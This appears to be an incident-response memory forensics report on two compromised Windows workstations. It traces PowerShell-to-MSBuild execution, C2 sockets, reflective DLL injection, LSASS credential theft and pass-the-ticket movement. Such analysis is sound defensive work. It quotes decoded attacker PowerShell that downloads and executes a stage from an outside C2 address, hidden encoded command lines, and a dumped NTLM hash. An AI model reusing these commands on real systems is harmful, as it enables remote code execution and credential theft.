# Memory Analysis: ART-002 (wst-ws-031.mem) and ART-003 (wst-ws-017.mem)

## Artifact Verification

- **ART-002 hash:** PENDING (baseline required before analysis)
- **ART-003 hash:** PENDING (baseline required before analysis)
- **Analysis tool:** Volatility 3

## ART-002 (wst-ws-031.mem) — WST-WS-031

### M01: Process Tree

```
7788  explorer.exe
* 7812  powershell.exe (-ep bypass -w hidden -enc)
** 8104  MSBuild.exe (C:\Users\dmarsh\AppData\Local\Temp\update.xml)
*** 7984  cmd.exe
```

**Finding:** PowerShell spawned MSBuild with encoded payload. Confirms SIEM alert A-20260414-9841.
**Technique:** T1127.001 (MSBuild proxy execution)
**Certainty:** CONFIRMED

### M02: PowerShell Command Line

```
powershell.exe -ep bypass -w hidden -enc JABzAD0AIgBoAHQAdABwAHMAOgAvAC8AbQBzADAAMwA2ADUA...
```

**Decoded:** `$s="https://185.220.101.47/beacon"; ... IEX(DownloadString("https://185.220.101.47/c2/stage2"))`

**Finding:** C2 initialization hardcoded in PowerShell script. Execution bypass (`-ep bypass`) disables policy.
**Technique:** T1059.001 (PowerShell)
**Certainty:** CONFIRMED

### M03: MSBuild Command Line

```
msbuild.exe C:\Users\dmarsh\AppData\Local\Temp\update.xml
```

**Finding:** Exact match to SIEM alert. Custom XML enables arbitrary code execution.
**Certainty:** CONFIRMED

### M04: Live C2 Connections

```
TCP  10.42.118.31:49832-49834  185.220.101.47:443  ESTABLISHED  PID 8104  MSBuild.exe
```

**Finding:** Three concurrent C2 sockets to TOR exit relay. Active at memory capture (2026-04-14T03:02Z). 
**Correlates with:** Proxy log 2026-04-14T02:46:58Z, 02:47:02Z, 02:47:30Z
**Technique:** T1071.001 (HTTPS C2), T1090.003 (TOR)
**Certainty:** CONFIRMED


### M05: Injected Code in MSBuild Memory

```
VAD: 0x1f0000 - 0x1f4fff (20 KB)
Protection: PAGE_EXECUTE_READWRITE
Hexdump: 4d 5a 90 00... (MZ header)
```

**Finding:** PE executable with MZ header in anonymous RWX memory. Reflective DLL injection pattern.
**Technique:** T1055.001 (DLL injection)
**Certainty:** CONFIRMED

### M06: CLR Runtime Loaded

```
clr.dll, mscoree.dll, mscorlib.dll
System.Core.dll, System.Net.dll
```

**Finding:** .NET runtime loaded for C# inline task execution from update.xml.
**Certainty:** CONFIRMED

### M07: LSASS Credential Access

```
Handles: SAM registry, Security hive, MSLSA_STATE (Kerberos tickets)
```

**Finding:** LSASS holds open handles to credential stores. Indicates harvesting opportunity.
**Technique:** T1003.001 (LSASS memory dump), T1558 (Kerberos ticket theft)
**Certainty:** PROBABLE


### M08: NTLM Hash Dump

```
dmarsh:1001:aad3b435b51404eeaad3b435b51404ee:a742f6d42e2aa1d62ef3249a1ef2f1c8:::
```

**Finding:** dmarsh NTLM hash extracted from SAM. Enables Pass-the-Hash attacks.
**Technique:** T1003.001 (Credential dumping)
**Certainty:** CONFIRMED

## ART-003 (wst-ws-017.mem) — WST-WS-017

### M01: Lateral Movement Process Tree

```
3452  powershell.exe (-ep bypass -w hidden -enc) [2026-04-14T03:22:47Z]
* 3624  MSBuild.exe [2026-04-14T03:23:14Z]
** 4012  cmd.exe [2026-04-14T03:23:45Z]
```

**Finding:** Same attack pattern executed 36 minutes after WST-WS-031 compromise.
**Correlates with:** Auth log Kerberos TGS-REQ from WST-WS-031 to WST-WS-017 at 2026-04-14T03:22:47Z
**Technique:** T1550.003 (Pass-the-Ticket)
**Certainty:** CONFIRMED

### M02: Different C2 Server

```
TCP  10.42.118.17:51234-51235  91.234.99.107:443  ESTABLISHED  PID 3624  MSBuild.exe
```

**Finding:** C2 connection to different infrastructure (91.234.99.107 instead of 185.220.101.47).
**Correlates with:** Proxy log 2026-04-14T03:27:13Z, 03:27:45Z
**Technique:** T1071.001 (HTTPS C2)
**Certainty:** CONFIRMED

### M03: Command Line (Lateral Movement Payload)

```
powershell.exe -ep bypass -w hidden -enc JABjAD0A... [DIFFERENT BASE64, SAME STRUCTURE]
```

**Decoded:** `$c="https://91.234.99.107/beacon"; ... IEX(DownloadString(...))`

**Finding:** Identical attack template; only C2 URL differs. Attacker reuses standardized payload.
**Certainty:** CONFIRMED

## Summary

**Process Injection:** Confirmed in MSBuild.exe (0x1f0000 MZ header, RWX memory)
**C2 Activity:** Active at both memory captures; TOR exit relay + C2 infrastructure
**Credential Theft:** NTLM hashes + Kerberos tickets harvested from LSASS
**Lateral Movement:** Pass-the-Ticket from WST-WS-031 → WST-WS-017 at 2026-04-14T03:22:47Z
**Replication:** Same multi-stage attack (PowerShell → MSBuild → injected code) on secondary host

**Chain of custody:** Entries to be logged for both artifacts with action `memory_analysis_complete`
